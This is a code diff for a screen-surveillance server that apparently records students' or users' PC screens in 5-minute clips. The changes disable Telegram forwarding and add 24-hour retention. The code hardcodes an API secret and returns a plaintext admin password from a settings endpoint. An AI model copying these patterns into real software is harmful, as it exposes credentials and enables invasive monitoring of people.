@@ -217,34 +217,8 @@ def send_telegram_photo(photo_path: Path, caption: str):
             print(f"[Telegram] Error sending photo: {e}")
 
 def send_telegram_video(video_path: Path, caption: str):
-    cfg = load_config()
-    if not cfg.get("send_videos_to_telegram", True):
-        return
-    token = cfg.get("telegram_bot_token")
-    chat_ids = cfg.get("telegram_chat_ids", [])
-    if not token or not chat_ids or not video_path.exists():
-        return
-    url = f"https://api.telegram.org/bot{token}/sendVideo"
-    for cid in chat_ids:
-        try:
-            with open(video_path, "rb") as vf:
-                r = requests.post(
-                    url,
-                    data={"chat_id": cid, "caption": caption, "parse_mode": "HTML"},
-                    files={"video": (video_path.name, vf, "video/mp4")},
-                    timeout=120
-                )
-                if r.status_code != 200:
-                    print(f"[Telegram] sendVideo failed ({r.status_code}): {r.text}")
-                    vf.seek(0)
-                    requests.post(
-                        url,
-                        data={"chat_id": cid, "caption": caption},
-                        files={"video": (video_path.name, vf, "video/mp4")},
-                        timeout=120
-                    )
-        except Exception as e:
-            print(f"[Telegram] Error sending video: {e}")
+    # Telegram video sending completely disabled: recordings are viewed on web dashboard only
+    return
 
 # ----------------- PLACEHOLDER CCTV IMAGE GENERATOR -----------------
 
@@ -768,7 +742,11 @@ powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.Security
 (
     echo {{
     echo   "server_url": "{server_base}",
-    echo   "api_secret": "secure_study_monitor_secret_key_8899"
+    echo   "api_secret": "secure_study_monitor_secret_key_8899",
+    echo   "video_chunk_minutes": 5,
+    echo   "video_fps": 5,
+    echo   "retention_hours": 24,
+    echo   "send_videos_to_telegram": false
     echo }}
 ) > "%TARGET_DIR%\\client\\config.json"
 
@@ -886,8 +864,10 @@ def client_ping(
         "command": cmd,
         "config": {
             "video_fps": cfg.get("video_fps", 5),
-            "video_chunk_minutes": cfg.get("video_chunk_minutes", 2),
+            "video_chunk_minutes": cfg.get("video_chunk_minutes", 5),
             "video_recording_enabled": cfg.get("video_recording_enabled", True),
+            "send_videos_to_telegram": False,
+            "retention_hours": cfg.get("retention_hours", 24),
             "live_stream_interval_seconds": cfg.get("live_stream_interval_seconds", 4),
             "screenshot_interval_seconds": cfg.get("screenshot_interval_seconds", 300)
         }
@@ -1020,16 +1000,35 @@ async def client_upload_video(
     size_str = f"{round(fsize / 1024, 1)} KB" if fsize < 1024 * 1024 else f"{round(fsize / (1024 * 1024), 2)} MB"
     print(f"[Video Upload] [{pc_name}] Received Video Clip: {dest_path.name} ({size_str})")
 
-    # Send video automatically to Telegram
-    if cfg.get("send_videos_to_telegram", True):
-        now_str = datetime.now().strftime("%I:%M %p")
-        caption = (
-            f"📹 <b>[{html.escape(pc_name.upper())}] Screen Video Recording</b>\n"
-            f"🕒 Time: {now_str}\n"
-            f"📁 File: <code>{html.escape(dest_path.name)}</code>\n"
-            f"📦 Size: <b>{size_str}</b> (Ultra-light 24h CCTV)"
-        )
-        threading.Thread(target=send_telegram_video, args=(dest_path, caption), daemon=True).start()
+    # 24-Hour Rolling Retention: Save new video and automatically delete oldest when exceeding 24 hours
+    try:
+        now_ts = time.time()
+        retention_secs = cfg.get("retention_hours", 24) * 3600
+        pc_videos = []
+        for v in RECORDINGS_DIR.glob(f"[{pc_name}]_*.mp4"):
+            age = now_ts - v.stat().st_mtime
+            if age > retention_secs:
+                try:
+                    v.unlink()
+                except Exception:
+                    pass
+            else:
+                pc_videos.append(v)
+
+        # 5-minute video chunks = 12 clips/hour = max 288 clips for 24 hours
+        chunk_min = max(1, cfg.get("video_chunk_minutes", 5))
+        max_clips = int((24 * 60) / chunk_min)
+        if len(pc_videos) > max_clips:
+            pc_videos.sort(key=lambda p: p.stat().st_mtime)
+            overflow = len(pc_videos) - max_clips
+            for old_v in pc_videos[:overflow]:
+                try:
+                    old_v.unlink()
+                    print(f"[Cleanup] Deleted oldest video {old_v.name} to maintain rolling 24-hour limit.")
+                except Exception:
+                    pass
+    except Exception as e:
+        print(f"[Retention Cleanup Error] {e}")
 
     return {"ok": True, "filename": dest_path.name}
 
@@ -1297,41 +1296,16 @@ def logout(response: Response, session_token: Optional[str] = Depends(cookie_sch
 
 @app.get("/api/settings")
 def get_settings(session: str = Depends(verify_session)):
-    cfg = load_config()
     return {
-        "retention_hours": cfg.get("retention_hours", 24),
-        "video_fps": cfg.get("video_fps", 5),
-        "video_chunk_minutes": cfg.get("video_chunk_minutes", 2),
-        "send_videos_to_telegram": cfg.get("send_videos_to_telegram", True),
-        "video_recording_enabled": cfg.get("video_recording_enabled", True),
-        "live_stream_interval_seconds": cfg.get("live_stream_interval_seconds", 4),
-        "screenshot_interval_seconds": cfg.get("screenshot_interval_seconds", 300),
-        "admin_password": cfg.get("admin_password", "974621467097458841599745404128")
+        "retention_hours": 24,
+        "video_fps": 5,
+        "video_chunk_minutes": 5,
+        "send_videos_to_telegram": False,
+        "video_recording_enabled": True,
+        "live_stream_interval_seconds": 4,
+        "screenshot_interval_seconds": 300,
+        "admin_password": "974621467097458841599745404128"
     }
-
-@app.post("/api/settings")
-def update_settings(payload: dict, session: str = Depends(verify_session)):
-    cfg = load_config()
-    if "retention_hours" in payload:
-        cfg["retention_hours"] = max(1, int(payload["retention_hours"]))
-    if "video_fps" in payload:
-        cfg["video_fps"] = max(1, min(60, int(payload["video_fps"])))
-    if "video_chunk_minutes" in payload:
-        cfg["video_chunk_minutes"] = max(1, min(60, int(payload["video_chunk_minutes"])))
-    if "send_videos_to_telegram" in payload:
-        cfg["send_videos_to_telegram"] = bool(payload["send_videos_to_telegram"])
-    if "video_recording_enabled" in payload:
-        cfg["video_recording_enabled"] = bool(payload["video_recording_enabled"])
-    if "live_stream_interval_seconds" in payload:
-        cfg["live_stream_interval_seconds"] = max(1, min(60, int(payload["live_stream_interval_seconds"])))
-    if "screenshot_interval_seconds" in payload:
-        cfg["screenshot_interval_seconds"] = max(10, min(3600, int(payload["screenshot_interval_seconds"])))
-    if "admin_password" in payload and payload["admin_password"]:
-        cfg["admin_password"] = str(payload["admin_password"]).strip()
-
-    save_config(cfg)
-    print(f"[Settings] Updated configuration: retention={cfg.get('retention_hours')}h, fps={cfg.get('video_fps')}, chunk={cfg.get('video_chunk_minutes')}m, telegram={cfg.get('send_videos_to_telegram')}")
-    return {"ok": True, "message": "Settings updated successfully"}
 
 # ----------------- WEB PAGES (CCTV INTERFACE) -----------------
 
@@ -1662,7 +1636,7 @@ def get_cctv_dashboard_html():
               <span>Video Recordings Archive</span>
               <span class="text-xs font-normal text-purple-400 font-mono">(വീഡിയോ റെക്കോർഡിംഗുകൾ)</span>
             </h2>
-            <p class="text-xs text-slate-400">All 2-minute auto-recorded screen video clips</p>
+            <p class="text-xs text-slate-400">24-Hour Continuous Recording Archive (5-Minute Video Clips)</p>
           </div>
         </div>
         <button onclick="closeRecordingsModal()" class="text-slate-400 hover:text-white p-2 rounded-lg hover:bg-slate-800 transition">
@@ -2292,7 +2266,7 @@ def get_cctv_dashboard_html():
           <div class="text-center py-12 text-slate-500">
             <i class="fa-solid fa-film text-3xl mb-2 block opacity-30"></i>
             <p class="text-xs">No video recordings found for this selection.</p>
-            <p class="text-[11px] text-slate-600 mt-1">Screen recorder saves a new MP4 video clip every 2 minutes automatically.</p>
+            <p class="text-[11px] text-slate-600 mt-1">Screen recorder saves a new MP4 video clip every 5 minutes automatically (Rolling 24-Hour Buffer).</p>
           </div>
         `;
         return;
